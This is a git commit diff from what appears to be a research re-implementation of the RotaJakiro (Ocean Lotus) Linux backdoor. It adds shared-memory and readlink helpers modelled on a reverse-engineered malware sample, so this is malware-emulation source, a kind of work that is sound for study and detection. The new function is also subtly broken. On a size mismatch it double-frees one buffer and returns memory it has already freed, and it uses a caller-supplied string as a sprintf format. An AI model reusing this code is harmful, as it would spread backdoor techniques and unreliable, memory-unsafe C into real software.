43f2e07d9211cce6f652491dfff6591b5324a518
Jared Stroud <1250113+archcloudlabs@users.noreply.github.com>
2023-06-09 10:11:00 -0400

    no intel for shmcreate, added shmget/custom read

--- ocean_lotus/rota/src/utils.c
+++ ocean_lotus/rota/src/utils.c
@@ -4,7 +4,9 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <sys/stat.h>
+#include <sys/shm.h>
 #include <sys/mman.h>
+#include <unistd.h>
 
 /**
  * Create a lock file to ensure one instance is running.
@@ -17,23 +19,52 @@ void create_lock();
 
 
 /**
- * Create chared memory instance
- * @param mem a char pointer that contains the name of the shared memory instance.
- * @return integer value to be used as a file descriptor
+ * wrapper function to create data from shared memory instance
+ * Reference: https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+ * @param identifier name of shared mem file.
+ * @param size number of bytes to read.
  * */
-int shm_create(char *mem) {
+int shm_get(int identifier, int size) {
 
-    if (!mem) {
+    // NULL check
+    if (!identifier) {
         return -1;
     }
 
-    // O_CREAT | O_EXCL | O_RDWR -> shared mem is created can be exectuded read/written to.
-    // S_IRUSR | S_IWUSR -> allow users to read/write
-    int fd = shm_open(mem, O_CREAT | O_APPEND | O_EXCL | O_RDWR,
-                                 S_IRUSR | S_IWUSR);
+    // Note - this method *does not* create a file artifact in /dev/shm
+    return shmget(identifier, size, 0x3b6);
+}
 
 
-    return fd;
+/**
+ * obtain PID from shared mem instance
+ *
+ * @param size: size of data to copy into buffer
+ * @param fpath file path to read in
+ *
+ * @return pointer to char buffer
+ * */
+
+char *copy_pid_from_shared_mem(uint size, char *fpath) {
+
+    // the structure was copied from reveree engineering
+    // function at offset 0x0040736f in sample 5c0f375e92f551e8f2321b141c15c48f
+    char *tmpFileBuff = (char *)malloc(0x40);
+    bzero(tmpFileBuff, 0x40);
+    sprintf(tmpFileBuff, fpath, size);
+
+    char *filePathBuff= (char *)malloc(0x1000);
+    bzero(filePathBuff, 0x1000);
+    int bytesRead = readlink(tmpFileBuff, filePathBuff, 0xfff);
+
+    if (bytesRead != size) {
+        free(tmpFileBuff);
+        free(filePathBuff);
+    }
+
+    free(tmpFileBuff);
+
+    return filePathBuff;
 }
 
 
